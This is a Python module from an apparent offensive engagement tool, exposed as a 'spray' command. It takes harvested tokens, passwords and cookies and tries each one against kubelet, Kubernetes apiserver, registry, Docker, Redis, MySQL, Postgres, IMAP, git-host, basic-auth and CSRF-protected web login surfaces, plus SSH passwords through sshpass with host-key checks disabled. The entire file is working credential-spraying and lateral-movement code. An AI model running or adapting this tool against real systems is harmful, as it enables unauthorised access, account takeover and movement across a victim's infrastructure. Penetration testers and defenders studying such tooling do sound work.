#!/usr/bin/env python3
"""
spray.py — token spray: every harvested credential against every
authenticated surface on the box, with authn/authz differential testing.

Post-Cobblestone lessons 11-12, enforced in code:

* The kubelet miss is the CANONICAL case: a harvested SA token / password /
  JWT is never filed away — it is automatically fired against the kubelet
  (10250 /pods + exec), the apiserver, registry APIs, SSH, the docker socket
  and every discovered HTTP surface, with ALL protocol variants (Bearer,
  Basic, X-Api-Key, cookie, query param).
* 401 (unauthenticated) triggers an automatic retry with EVERY held
  credential — a credential is only dead when it 401s everywhere.
* Responses are classified distinctly and honestly:
    400 bad-request            — malformed/unsupported (websocket upgrade
                                 failures land here, not in 403)
    401 unauthenticated        — retry with all held credentials
    403 protocol-mismatch      — websocket/subprotocol rejection: NOT RBAC,
                                 NEVER reported as an authorization denial
    403 rbac-denial            — the credential authenticated but was denied
    403 forbidden-unknown      — not classifiable as either
    404 not-found              — surface absent (kubelet version, path)
    500 server-error           — retry-later candidate, not a denial
  A 403-with-subprotocol-mismatch is never equated with RBAC denial, and an
  RBAC denial is never downgraded to "no access" — it proves authentication.
* Successful probes become findings with evidence, and the credential is
  added to the engagement credential set so nothing is re-sprayed.
"""
import base64
import json
import os
import re
import subprocess
from urllib.parse import quote, urlparse

from .k8s import (KUBELET_PORT, APISERVER_PORT, REGISTRY_PORT,
                  DOCKER_TCP_PORT, _https_request, docker_socket_version)

CRED_TYPES = ("sa-token", "jwt", "password", "api-key", "bearer", "cookie")

# classification vocabulary — 400/401/403/404/500 are NEVER collapsed
WS_MARKERS = ("websocket", "subprotocol", "upgrade")
RBAC_MARKERS = ("forbidden", "unauthorized to", "cannot ", "denied", "rbac",
                "user=")


def classify_response(status, body, url="", headers=None):
    """Differential classifier. Returns (class, label). A 403 with a
    websocket/subprotocol body is a PROTOCOL mismatch — never RBAC.
    Redirects are classified by their TARGET, not by the transport."""
    b = (body or "").lower()
    if status in (301, 302, 303, 307, 308) and headers:
        loc = (headers or {}).get("location", "")
        if _loginish(loc, url):
            return ("redirect-login", f"redirect back to a login surface "
                    f"({loc[:80]}) — authentication failed")
        return ("redirect-other", f"redirect to {loc[:80]} — "
                "post-auth navigation, success candidate")
    if status == 400:
        if any(m in b for m in WS_MARKERS):
            return ("400-bad-request", "websocket/upgrade required — client "
                    "did not speak the exec protocol (not a denial)")
        return ("400-bad-request", "malformed request")
    if status == 401:
        return ("401-unauthenticated", "no credential accepted — retry with "
                "every held credential")
    if status == 403:
        if any(m in b for m in WS_MARKERS):
            return ("403-protocol-mismatch", "subprotocol/upgrade rejection — "
                    "protocol mismatch, NOT an RBAC denial; retry with the "
                    "correct channel subprotocol")
        if any(m in b for m in RBAC_MARKERS):
            return ("403-rbac-denial", "credential AUTHENTICATED but was "
                    "denied authorization — proof of identity, keep the token")
        return ("403-forbidden-unknown", "forbidden, unclassifiable — inspect "
                "body before concluding either way")
    if status == 404:
        return ("404-not-found", "surface/path absent (version or API gap)")
    if status == 500:
        return ("500-server-error", "server-side failure — retry-later "
                "candidate, not a denial")
    if status and status < 400:
        return ("2xx-ok", "accepted — credential valid on this surface")
    return (f"{status}-unknown", "unclassified")


def _loginish(location, url):
    loc = (location or "").lower()
    if not loc:
        return False
    if any(k in loc for k in ("login", "signin", "sign-in", "auth", "session",
                              "oauth", "saml")):
        return True
    base = (url or "").split("?")[0].rstrip("/").lower()
    return loc.split("?")[0].rstrip("/") == base


# ---------------- credential set ----------------
def load_credentials(eng=None, files=(), state_creds=None):
    """Harvested credential set: engagement state + findings ledger +
    explicit creds files (JSON list, 'type:value' lines, or raw tokens)."""
    creds = list(state_creds or [])
    if eng is not None:
        for c in eng.state.get("credentials", []):
            if isinstance(c, dict) and c.get("value"):
                creds.append(c)
        try:
            from . import memory
            for rec in _ledger_rows():
                cls = (rec.get("class") or "").lower()
                if any(k in cls for k in ("credential", "password", "token",
                                          "sa-token", "jwt", "key")):
                    val = rec.get("evidence") or rec.get("title")
                    if isinstance(val, str) and len(val) > 6:
                        creds.append({"type": "jwt" if "." in val else "password",
                                      "value": val.split()[0], "source": "ledger"})
        except Exception:
            pass
    for path in files:
        try:
            raw = open(path, encoding="utf-8").read()
            if raw.lstrip().startswith("["):
                for c in json.loads(raw):
                    if isinstance(c, dict) and c.get("value"):
                        creds.append(c)
            else:
                for line in raw.splitlines():
                    line = line.strip()
                    if not line or line.startswith("#"):
                        continue
                    if ":" in line and line.split(":", 1)[0] in CRED_TYPES:
                        t, v = line.split(":", 1)
                        creds.append({"type": t, "value": v})
                    else:
                        creds.append({"type": "sa-token" if "." in line
                                      else "password", "value": line})
        except OSError as e:
            print(f"cannot read creds {path}: {e}")
    seen, out = set(), []
    for c in creds:
        if not isinstance(c, dict) or not c.get("value"):
            continue
        key = (c.get("type", "password"), c["value"])
        if key in seen:
            continue
        seen.add(key)
        out.append(c)
    return out


def _ledger_rows():
    try:
        from . import memory
        path = os.path.join(memory._root(), "findings.jsonl")
        with open(path, encoding="utf-8") as f:
            return [json.loads(l) for l in f if l.strip()]
    except (OSError, ValueError):
        return []


# ---------------- protocol variants ----------------
def request_forms(cred, surface_kind):
    """Every protocol variant a credential can be fired in. Returns a list
    of (headers_dict, note)."""
    value = cred.get("value", "")
    user = cred.get("user") or "root"
    kind = cred.get("type", "bearer")
    forms = []
    if kind in ("sa-token", "jwt", "bearer"):
        forms.append(({"Authorization": f"Bearer {value}"}, "bearer"))
        if kind == "jwt":
            forms.append(({"X-Api-Key": value}, "x-api-key"))
    if kind in ("sa-token", "jwt", "api-key"):
        if not forms:
            forms.append(({"Authorization": f"Bearer {value}"}, "bearer"))
        forms.append(({"X-Api-Key": value}, "x-api-key"))
        if surface_kind in ("kubelet", "apiserver"):
            forms.append(({"Authorization": f"Bearer {value}"}, "bearer"))
    if kind == "password":
        auth = base64.b64encode(f"{user}:{value}".encode()).decode()
        forms.append(({"Authorization": f"Basic {auth}"}, f"basic:{user}"))
        forms.append(({"Cookie": f"session={value}"}, "cookie"))
    if kind == "cookie":
        forms.append(({"Cookie": f"session={value}"}, "cookie"))
    if surface_kind == "registry":
        auth = base64.b64encode(f"{user}:{value}".encode()).decode()
        forms.append(({"Authorization": f"Basic {auth}"}, f"basic:{user}"))
    return forms


# ---------------- surface builder ----------------
def build_surfaces(eng):
    """Every authenticated surface on the box, from recon state. The
    registry is extensible (register_surface) — a closed list is the bug
    this kills (lesson 17)."""
    hosts = set()
    for seed in eng.state.get("seeds", []):
        h = urlparse(seed if "://" in seed else "//" + seed).hostname or seed
        hosts.add(h)
    urls = []
    ports = {}
    for t in eng.state.get("targets", []):
        hosts.add(t.get("host"))
        ports[t.get("host")] = ports.get(t.get("host"), set()) | \
            set((t.get("ports") or {}).keys())
        for u in t.get("urls", []):
            urls.append(u.get("url"))
        for sd in t.get("subdomains", []):
            hosts.add(sd)
    surfaces = []
    for h in sorted(hosts):
        if not h or h in ("localhost", "127.0.0.1", "::1"):
            continue
        surfaces.append({"kind": "kubelet", "host": h, "port": KUBELET_PORT,
                         "paths": ["/pods", "/runningpods/"],
                         "name": f"kubelet:{h}:{KUBELET_PORT}"})
        surfaces.append({"kind": "apiserver", "host": h, "port": APISERVER_PORT,
                         "paths": ["/api/v1/namespaces", "/version"],
                         "name": f"apiserver:{h}:{APISERVER_PORT}"})
        surfaces.append({"kind": "registry", "host": h, "port": REGISTRY_PORT,
                         "paths": ["/v2/"], "name": f"registry:{h}:{REGISTRY_PORT}"})
        surfaces.append({"kind": "docker-tcp", "host": h, "port": DOCKER_TCP_PORT,
                         "paths": ["/containers/json", "/version"],
                         "name": f"docker-tcp:{h}:{DOCKER_TCP_PORT}"})
        open_ports = ports.get(h, set())
        if 6379 in open_ports:
            surfaces.append({"kind": "redis", "host": h, "port": 6379,
                             "paths": [], "name": f"redis:{h}:6379"})
        if 3306 in open_ports:
            surfaces.append({"kind": "mysql", "host": h, "port": 3306,
                             "paths": [], "name": f"mysql:{h}:3306"})
        if 5432 in open_ports:
            surfaces.append({"kind": "postgres", "host": h, "port": 5432,
                             "paths": [], "name": f"postgres:{h}:5432"})
        for port in (143, 993):
            if port in open_ports:
                surfaces.append({"kind": "imap", "host": h, "port": port,
                                 "paths": [], "name": f"imap:{h}:{port}"})
    for u in urls:
        surfaces.append({"kind": "http", "host": "", "url": u, "paths": [],
                         "name": f"http:{u}"})
        surfaces.append({"kind": "basic-auth", "host": "", "url": u,
                         "paths": [], "name": f"basic-auth:{u}"})
        surfaces.append({"kind": "git-host", "host": "", "origin": u,
                         "paths": [], "name": f"git-host:{u}"})
    for form in eng.state.get("login_forms", []):
        surfaces.append(dict(form, name=form.get("name") or
                             f"web-login:{form.get('url')}"))
    surfaces.append({"kind": "docker-socket", "host": "", "paths": [],
                     "name": "docker-socket:/var/run/docker.sock"})
    return surfaces


def probe_surface(surface, headers=None, timeout=6):
    """One probe against one surface. Returns (status, body, note)."""
    if surface.get("kind") == "docker-socket":
        r = docker_socket_version(timeout=timeout)
        return r.get("status"), r.get("body", ""), "unix-socket"
    if surface.get("kind") == "http":
        try:
            r = _http_req(surface["url"], headers=headers, timeout=timeout)
            return r.get("status"), r.get("body", ""), "http"
        except OSError as e:
            return None, "", f"err:{e}"
    results = []
    for path in surface.get("paths", ["/"]):
        try:
            r = _https_request(surface["host"], surface["port"], path,
                               headers=headers, timeout=timeout)
            results.append(r)
        except OSError as e:
            results.append({"status": None, "body": "", "error": str(e)})
    # surface verdict: prefer the most informative result — a 401/403/2xx
    # beats a 404 (which may just mean the path variant is absent)
    ranked = sorted(results, key=lambda r: _rank(r.get("status")))
    best = ranked[0] if ranked else {"status": None, "body": ""}
    return best.get("status"), best.get("body", ""), "tcp"


def _rank(status):
    if status is None:
        return 9
    if status < 400:
        return 0
    if status in (401, 403):
        return 1
    if status in (400, 500):
        return 2
    return 3  # 404 etc


def _http_req(url, headers=None, timeout=6):
    u = urlparse(url)
    return _https_request(u.hostname, u.port or (443 if u.scheme == "https"
                                                 else 80),
                          u.path or "/", headers=headers, timeout=timeout)


# ---------------- stateful web logins (lesson 17) ----------------
_CSRF_FIELDS = ("csrf", "_csrf", "csrf_token", "csrf-token", "_token",
                "authenticity_token", "__requestverificationtoken",
                "xsrf", "_xsrf", "nonce", "token")

_LOGIN_FIELDS = ("user", "username", "login", "email", "id")
_PASSWORD_FIELDS = ("password", "passwd", "pass", "pwd", "secret")


def extract_csrf(html):
    """CSRF token extraction from a login page. Returns (name, value) or
    (None, None)."""
    for m in re.finditer(r'<input\b[^>]*>', html or "", re.I | re.S):
        tag = m.group(0)
        name = re.search(r'name\s*=\s*["\']([^"\']+)["\']', tag, re.I)
        value = re.search(r'value\s*=\s*["\']([^"\']*)["\']', tag, re.I)
        if name and name.group(1).lower().replace("-", "").replace("_", "") \
                in {f.replace("-", "").replace("_", "")
                    for f in _CSRF_FIELDS}:
            return name.group(1), (value.group(1) if value else "")
    return None, None


def parse_login_form(html, base_url):
    """Login form contract: action, csrf field, user/password field names."""
    form = re.search(r'<form\b[^>]*>', html or "", re.I)
    if not form:
        return None
    action = re.search(r'action\s*=\s*["\']([^"\']*)["\']', form.group(0), re.I)
    action = (action.group(1) if action else "") or ""
    if action.startswith("/"):
        from urllib.parse import urlparse as _up
        u = _up(base_url)
        action = f"{u.scheme}://{u.netloc}{action}"
    elif action and "://" not in action:
        action = base_url.rstrip("/") + "/" + action
    names = [n for n in re.findall(r'name\s*=\s*["\']([^"\']+)["\']',
                                   html or "", re.I)]
    user_field = next((n for n in names
                       if n.lower() in _LOGIN_FIELDS), "username")
    pass_field = next((n for n in names
                       if n.lower() in _PASSWORD_FIELDS), "password")
    return {"action": action or base_url, "user_field": user_field,
            "pass_field": pass_field}


def discover_login_forms(eng, transport, timeout=8, log=None):
    """Automatic: every discovered web origin is checked for a stateful
    login form; found forms become web-login surfaces (stored in state)."""
    log = log or (lambda m: None)
    found = []
    seen = set()
    for t in eng.state.get("targets", []):
        for u in t.get("urls", []):
            url = u.get("url") or ""
            if url in seen:
                continue
            seen.add(url)
            try:
                r = transport.request("GET", url, context="anon",
                                      timeout=timeout)
            except OSError:
                continue
            body = r.get("body", "")
            if 'type="password"' not in body and "type='password'" not in body:
                continue
            form = parse_login_form(body, url)
            if not form:
                continue
            csrf_name, _ = extract_csrf(body)
            surf = {"kind": "web-login", "url": url, "action": form["action"],
                    "user_field": form["user_field"],
                    "pass_field": form["pass_field"], "csrf_field": csrf_name,
                    "name": f"web-login:{url}"}
            if surf not in eng.state.setdefault("login_forms", []):
                eng.state["login_forms"].append(surf)
                found.append(surf)
                log(f"login form discovered: {url} (csrf={csrf_name})")
    if found:
        eng.save()
    return found


def web_login_probe(surface, cred, transport, timeout=8):
    """One stateful web login attempt. Uses the origin-bound transport's
    context isolation: the CSRF-token GET rides the ANONYMOUS jar, the
    credential POST rides a per-user AUTH jar — never mixed (lesson 16).
    Returns a hit row or None."""
    url = surface.get("url") or ""
    if not url or cred.get("type") != "password":
        return None
    user = cred.get("user") or surface.get("user_field") or "admin"
    try:
        r = transport.request("GET", url, context="anon", timeout=timeout)
        csrf_name, csrf_value = extract_csrf(r.get("body", ""))
        form = parse_login_form(r.get("body", ""), url) or {}
        action = form.get("action") or url
        fields = {form.get("user_field") or "username": user,
                  form.get("pass_field") or "password": cred.get("value")}
        if csrf_name:
            fields[csrf_name] = csrf_value or ""
        body = "&".join(f"{k}={quote(str(v), safe='')}" for k, v in
                        fields.items()).encode()
        ctx = f"user:{user}"
        r2 = transport.request("POST", action, body=body,
                               headers={"Content-Type":
                                        "application/x-www-form-urlencoded"},
                               context=ctx, timeout=timeout)
        cls, label = classify_response(r2.get("status"), r2.get("body", ""),
                                       url, headers=r2.get("headers"))
        cred_label = f"password:{mask(cred.get('value'))}"
        resp_body = r2.get("body", "")
        still_login = re.search(r'type\s*=\s*["\']password', resp_body,
                                re.I) is not None
        if cls == "redirect-login":
            return None
        if cls == "redirect-other" or \
                (r2.get("status") == 200 and not still_login):
            return {"surface": surface["name"], "status": r2.get("status"),
                    "credential": cred_label, "form": "web-login",
                    "class": cls, "label": label, "hit": True,
                    "user": user}
        return None
    except OSError:
        return None


# ---------------- extensible surface registry (lesson 17) ----------------
# Every surface that accepts a credential is sprayable. The registry is
# OPEN: register_surface(kind, prober) adds a new surface type at runtime.
# prober(surface, creds, transport, timeout, log) -> list of hit rows.
SURFACE_REGISTRY = {}


def register_surface(kind, prober):
    SURFACE_REGISTRY[kind] = prober
    return kind


def _probe_git_host(surface, creds, transport, timeout=6, log=None):
    from . import gitmine
    origin = surface.get("origin") or ""
    if not origin:
        return []
    platform, _ = gitmine.detect_platform(origin, transport, timeout=timeout)
    if not platform:
        return []
    hits = []
    for cred in creds:
        token = cred.get("value")
        api = gitmine.build_api(origin, transport, token=token,
                                platform=platform, timeout=timeout)
        try:
            status, data = api("/user")
        except OSError:
            continue
        cls, label = classify_response(status,
                                       json.dumps(data)[:400] if data else "",
                                       origin)
        if status == 200:
            hits.append({"surface": surface["name"], "status": 200,
                         "credential": f"{cred.get('type','?')}:"
                                       f"{mask(token)}",
                         "form": f"git-{platform}", "class": cls,
                         "label": label, "hit": True, "platform": platform})
            break
    return hits


def _redis_ping(host, port, password, timeout=6):
    """Minimal RESP client (stdlib): PING, AUTH, PING."""
    import socket as _socket
    try:
        s = _socket.create_connection((host, port), timeout=timeout)
    except OSError as e:
        return None, f"err:{e}"
    try:
        s.sendall(b"*1\r\n$4\r\nPING\r\n")
        buf = b""
        while not buf.endswith(b"\r\n") and len(buf) < 512:
            chunk = s.recv(512)
            if not chunk:
                break
            buf += chunk
        first = buf[:64].decode("utf-8", "ignore").strip()
        if first.startswith("-NOAUTH") and password:
            s.sendall(b"*2\r\n$4\r\nAUTH\r\n$%d\r\n%s\r\n" %
                      (len(password.encode()), password.encode()))
            buf = b""
            while not buf.endswith(b"\r\n") and len(buf) < 512:
                chunk = s.recv(512)
                if not chunk:
                    break
                buf += chunk
            return buf.startswith(b"+OK"), buf[:80].decode("utf-8", "ignore")
        if first.startswith("+PONG"):
            return True, "unauthenticated PONG"
        if first.startswith("-NOAUTH"):
            return None, "auth required"
        return False, first
    except OSError as e:
        return None, f"err:{e}"
    finally:
        try:
            s.close()
        except OSError:
            pass


def _probe_databases(surface, creds, transport, timeout=6, log=None):
    hits = []
    kind = surface.get("kind")
    host, port = surface.get("host"), surface.get("port")
    if kind == "redis":
        for cred in creds:
            ok, note = _redis_ping(host, port, cred.get("value"),
                                   timeout=timeout)
            if ok:
                hits.append({"surface": surface["name"], "status": 0,
                             "credential": f"{cred.get('type','?')}:"
                                           f"{mask(cred.get('value'))}",
                             "form": "redis-a" + ("uth" if note !=
                                                  "unauthenticated PONG"
                                                  else "non"),
                             "class": "2xx-ok", "label": note, "hit": True})
    elif kind in ("mysql", "postgres"):
        client = {"mysql": "mysql", "postgres": "psql"}[kind]
        import shutil as _sh
        if not _sh.which(client):
            return hits
        for cred in creds:
            if cred.get("type") != "password":
                continue
            user = cred.get("user") or "root"
            cmd = ([client, "-h", host, "-P", str(port), "-u", user]
                   + (["--password=" + cred.get("value")]
                      if kind == "mysql" else []))
            env = dict(os.environ)
            if kind == "postgres":
                env["PGPASSWORD"] = cred.get("value")
                cmd += ["-c", "SELECT 1"]
            else:
                cmd += ["-e", "SELECT 1"]
            try:
                p = subprocess.run(cmd, capture_output=True, text=True,
                                   timeout=timeout + 4, env=env)
            except (subprocess.TimeoutExpired, OSError):
                continue
            if p.returncode == 0 and "ERROR" not in (p.stdout + p.stderr)[:200]:
                hits.append({"surface": surface["name"], "status": 0,
                             "credential": f"password:{mask(cred.get('value'))}",
                             "form": f"{kind}-login", "class": "2xx-ok",
                             "label": "login accepted", "hit": True})
    return hits


def _probe_imap(surface, creds, transport, timeout=6, log=None):
    hits = []
    import imaplib
    host, port = surface.get("host"), surface.get("port")
    ssl_mode = port in (993,)
    for cred in creds:
        if cred.get("type") != "password":
            continue
        user = cred.get("user") or surface.get("user") or "root"
        try:
            cls = imaplib.IMAP4_SSL if ssl_mode else imaplib.IMAP4
            m = cls(host, port, timeout=timeout)
            try:
                typ, _ = m.login(user, cred.get("value"))
                if typ == "OK":
                    hits.append({"surface": surface["name"], "status": 0,
                                 "credential":
                                 f"password:{mask(cred.get('value'))}",
                                 "form": "imap-login", "class": "2xx-ok",
                                 "label": "IMAP login accepted", "hit": True})
            finally:
                try:
                    m.logout()
                except Exception:
                    pass
        except Exception:
            continue
    return hits


def _probe_basic_auth(surface, creds, transport, timeout=6, log=None):
    hits = []
    for cred in creds:
        for headers, form in request_forms(cred, "basic-auth"):
            if "Authorization" not in headers:
                continue
            try:
                r = transport.request("GET", surface.get("url") or "/",
                                      headers=headers,
                                      context=f"basic:{mask(cred.get('value'))}",
                                      timeout=timeout)
            except OSError:
                continue
            cls, label = classify_response(r.get("status"), r.get("body", ""),
                                           surface.get("url", ""),
                                           headers=r.get("headers"))
            if r.get("status") == 200:
                hits.append({"surface": surface["name"], "status": 200,
                             "credential": f"{cred.get('type','?')}:"
                                           f"{mask(cred.get('value'))}",
                             "form": form, "class": cls, "label": label,
                             "hit": True})
                break
            if r.get("status") != 401:
                break
    return hits


def _probe_web_login(surface, creds, transport, timeout=6, log=None):
    hits = []
    for cred in creds:
        row = web_login_probe(surface, cred, transport, timeout=timeout)
        if row:
            hits.append(row)
    return hits


def _register_defaults():
    register_surface("git-host", _probe_git_host)
    register_surface("web-login", _probe_web_login)
    register_surface("basic-auth", _probe_basic_auth)
    register_surface("imap", _probe_imap)
    register_surface("redis", _probe_databases)
    register_surface("mysql", _probe_databases)
    register_surface("postgres", _probe_databases)


_register_defaults()


# ---------------- SSH probe (optional, deterministic skip if no sshpass) -----
def ssh_probe(host, port, user, password, timeout=8):
    """Password login probe via sshpass. Returns (ok, note). Never raises."""
    if not _has_sshpass():
        return None, "sshpass missing — ssh surface skipped"
    try:
        p = subprocess.run(
            ["sshpass", "-p", password, "ssh",
             "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
             "-o", "PreferredAuthentications=password", "-o",
             "PubkeyAuthentication=no", "-o", "NumberOfPasswordPrompts=1",
             "-o", f"ConnectTimeout={timeout}", "-p", str(port),
             f"{user}@{host}", "echo __SR_SSH_OK__"],
            capture_output=True, text=True, timeout=timeout + 5)
        ok = p.returncode == 0 and "__SR_SSH_OK__" in p.stdout
        return ok, "login" if ok else "denied"
    except (subprocess.TimeoutExpired, OSError) as e:
        return None, f"err:{e}"


def _has_sshpass():
    import shutil
    return shutil.which("sshpass") is not None or shutil.which("shpass") is not None


# ---------------- the spray ----------------
def mask(value):
    v = str(value or "")
    if len(v) <= 8:
        return v[:2] + "***"
    return v[:6] + "..." + v[-4:]


def spray(eng, creds=None, log=None, ssh=True, probe=None, timeout=6,
          transport=None, registry=None, extra_surfaces=()):
    """Fire every held credential against every authenticated surface.
    Baseline (unauthenticated) first; a 401 anywhere automatically triggers
    the full credential set. `probe` is injectable for tests; registered
    surface kinds (web-login, git-host, databases, imap, basic-auth) run
    through their registry probers on the origin-bound transport.
    `extra_surfaces` appends operator/extension surfaces to the sweep."""
    log = log or (lambda m: None)
    probe = probe or probe_surface
    creds = creds or load_credentials(eng)
    surfaces = build_surfaces(eng) + list(extra_surfaces)
    registry = registry if registry is not None else SURFACE_REGISTRY
    if transport is None:
        from .http import OriginTransport
        transport = OriginTransport(timeout=timeout, insecure=True)
    hits, tried = [], 0
    for surface in surfaces:
        kind = surface.get("kind")
        if kind in registry:
            try:
                for row in registry[kind](surface, creds, transport,
                                          timeout=timeout, log=log):
                    hits.append(row)
                    log(f"spray HIT {surface['name']} via {row.get('form')} "
                        f"[{row.get('status')}] {row.get('class')}")
                tried += 1
            except Exception as e:
                log(f"spray {surface['name']}: prober error {e}")
            continue
        status, body, note = probe(surface, headers=None, timeout=timeout)
        cls, label = classify_response(status, body, surface.get("name", ""))
        log(f"spray {surface['name']}: [{status}] {cls}")
        tried += 1
        if status is not None and status < 400:
            hits.append({"surface": surface["name"], "credential": None,
                         "status": status, "class": cls,
                         "note": f"UNAUTHENTICATED access ({label})"})
        # 401 -> automatically retry with EVERY held credential (lesson 12)
        if status in (401, 403) or cls in ("403-protocol-mismatch",
                                           "403-forbidden-unknown"):
            for cred in creds:
                for headers, form in request_forms(cred, surface.get("kind")):
                    st, bd, nt = probe(surface, headers=headers, timeout=timeout)
                    c2, l2 = classify_response(st, bd, surface["name"])
                    tried += 1
                    row = {"surface": surface["name"], "status": st,
                           "credential": f"{cred.get('type', '?')}:{mask(cred.get('value'))}",
                           "form": form, "class": c2, "label": l2}
                    if st is not None and st < 400:
                        row["hit"] = True
                        hits.append(row)
                        log(f"spray HIT {surface['name']} via {form} "
                            f"[{st}] {c2}", )
                    if st != 401:
                        break  # this credential got a verdict; next cred
    # ssh surface: password creds against every host:22
    if ssh and _has_sshpass():
        for cred in creds:
            if cred.get("type") != "password":
                continue
            for t in eng.state.get("targets", []):
                host = t.get("host")
                if not host or 22 not in (t.get("ports") or {}):
                    continue
                ok, note = ssh_probe(host, 22, cred.get("user") or "root",
                                     cred.get("value"), timeout=timeout)
                tried += 1
                if ok:
                    hits.append({"surface": f"ssh:{host}:22", "status": 0,
                                 "credential": f"password:{mask(cred.get('value'))}",
                                 "form": "ssh-password", "class": "2xx-ok",
                                 "hit": True})
                    log(f"spray HIT ssh:{host}:22 — password valid")
                else:
                    log(f"spray ssh:{host}:22 — {note}")
    return {"surfaces": len(surfaces), "probes": tried, "hits": hits,
            "credentials": len(creds)}


def hit_severity(hit):
    """Severity of a confirmed hit, by surface class."""
    s = hit.get("surface", "")
    if s.startswith("kubelet") or s.startswith("apiserver"):
        return "critical" if hit.get("credential") else "high"
    if s.startswith("ssh"):
        return "critical"
    if s.startswith("docker") or s.startswith("registry") \
            or s.startswith("git-host"):
        return "high"
    if s.startswith("web-login"):
        return "critical" if hit.get("user") in ("root", "admin") else "high"
    if s.startswith(("mysql", "postgres", "imap")):
        return "high"
    return "medium"


# ---------------- CLI ----------------
def cli_spray(args):
    from .state import Engagement
    from .http import OriginTransport
    base = os.path.abspath(args.dir)
    if not os.path.isfile(os.path.join(base, "state.json")):
        print(f"no engagement at {base} — run: shardreaper engage ...")
        return 1
    eng = Engagement.load(base)
    creds = load_credentials(eng, files=args.creds or [])
    if not creds:
        print("no held credentials — harvest first, or pass --creds file")
        return 2
    log = eng.log if hasattr(eng, "log") else (lambda m: print(m))
    transport = OriginTransport(timeout=args.timeout, insecure=True)
    # lesson 17: stateful web logins are surfaces — discover them first
    try:
        discover_login_forms(eng, transport, timeout=args.timeout, log=log)
    except Exception:
        pass
    result = spray(eng, creds, log=log, ssh=not args.no_ssh,
                   timeout=args.timeout, transport=transport)
    print(f"\nspray: {result['credentials']} credential(s) × "
          f"{result['surfaces']} surface(s) = {result['probes']} probes")
    for h in result["hits"]:
        print(f"  HIT [{hit_severity(h).upper():8s}] {h['surface']} "
              f"{h.get('credential') or 'unauthenticated'} [{h['status']}] "
              f"{h['class']}")
    out = os.path.join(base, "spray.json")
    with open(out, "w", encoding="utf-8") as f:
        json.dump(result, f, indent=1)
    print(f"\nreport written: {out}")
    return 0 if result["hits"] else 3


def build_arg_parser(sub):
    p = sub.add_parser("spray", help="token spray: every held credential × "
                       "every authenticated surface — kubelet/apiserver/"
                       "registry/ssh/docker, stateful web logins (CSRF), "
                       "git hosts, basic-auth APIs, databases, IMAP — with "
                       "all protocol variants (extensible registry)")
    p.add_argument("dir", help="engagement folder")
    p.add_argument("--creds", action="append", default=[],
                   help="credentials file (JSON list or type:value lines)")
    p.add_argument("--no-ssh", action="store_true", help="skip ssh password probes")
    p.add_argument("--timeout", type=float, default=6)
    p.set_defaults(fn=cli_spray)
    return p
